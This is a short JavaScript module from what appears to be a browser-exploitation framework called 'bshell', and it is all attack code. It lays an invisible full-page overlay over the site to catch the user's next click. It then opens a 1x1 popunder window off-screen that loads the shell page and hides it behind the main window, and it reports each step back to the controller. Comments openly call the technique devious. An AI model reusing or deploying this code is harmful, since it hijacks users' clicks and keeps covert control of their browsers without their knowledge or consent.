function(bsh) 
{
    var didIt=false;
    var p = function() {
	if(didIt)
	    return;
	didIt=true;

	bshell.send({status: "attempting to popunder."});

	var wF = "toolbar=0,statusbar=1,resizable=1,scrollbars=0,menubar=0,location=1,directories=0";
	if(navigator.userAgent.indexOf('Chrome') != -1)
	    wF = "scrollbar=yes";
	
	var Height = 1;
	var Width = 1;
	pu_w = open('bshell.html','bpopunder', wF + ",height=" + Height +",width=" + Width,"left=5000,top=5000");
	var regex = new RegExp(/rv:[1-9]/);
	if (regex.exec(navigator.userAgent)) {
	    try { pu_w.dblPop = function () { this.window.open('about:blank').close(); }; pu_w.dblPop(); }
	    catch(err) { }
	}
	setTimeout(window.focus,1);
	window.focus();
	try { pu_w.blur(); } catch(err) { }
	bshell.send({status: "success"});
	bshell.stop();
    }

    // x-browser stuffs
    var ae = function(obj, on, handler) {
	if(obj.addEventListener)
	    obj.addEventListener(on, handler);
	else if(obj.attachEvent)
	    obj.attachEvent('on'+on,handler);
    };
    
    // Devious shit:
    var d = document;
    var db = d.getElementsByTagName('body')[0];
    var o = d.createElement('div');
    o.setAttribute('style', 'z-index: 9999; background: green/*transparent*/; width: 10000px; height: 2000px; left:0px; top:0px; position:absolute;');
    db.appendChild(o);
    
    var pp = function() {
 	db.removeChild(o); 
	p(); 
    }
    ae(o, 'click', pp);  // works in chrome/ff & ie. opera pops up
    ae(document.body, 'click', pp);  // works in ie
    bshell.send({status: "overlay created. waiting for event"});
    //ae(o, 'mousemove', pp);  // works in ff?
    //  ae(o, 'keyup', p);  // doesn't work
    
    return false;
}(bshell);
